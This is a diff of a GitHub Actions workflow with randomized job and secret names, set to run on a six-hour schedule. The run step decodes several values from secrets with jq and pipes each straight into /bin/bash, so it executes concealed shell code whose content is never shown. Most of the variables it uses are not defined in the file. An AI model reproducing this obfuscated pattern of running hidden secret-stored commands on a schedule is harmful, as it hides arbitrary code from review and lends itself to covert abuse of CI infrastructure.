@@ -1,9 +1,9 @@
 name: yubanzhi4980
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
-
+    - cron: '30 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: yubanzhi4980
         env:
-          xhg21377: ${{ secrets.xhg21377 }}
+          pvesk554: ${{ secrets.pvesk554 }}
         run: |
-          echo $xhg21377 | jq -r .hdxds43697 | /bin/bash
-          echo $atayb8 | jq -r .kseo2 | /bin/bash
-          echo $ojf20373 | jq -r .xi06 | /bin/bash
-          echo $s99608 | jq -r .rek632 | /bin/bash
-          echo $ume05 | jq -r .n7026 | /bin/bash
-          echo $wqm74 | jq -r .a5 | /bin/bash
-          echo $hae34640 | jq -r .qpsu237 | /bin/bash
-          echo $taemt9679 | jq -r .dljpr5 | /bin/bash
-          echo $wf5 | jq -r .dbf5229 | /bin/bash
-          echo $pyt9553 | jq -r .enzn6 | /bin/bash
+          echo $pvesk554 | jq -r .gnx6639 | /bin/bash
+          echo $u7 | jq -r .y340 | /bin/bash
+          echo $t9247 | jq -r .elpgp71876 | /bin/bash
 
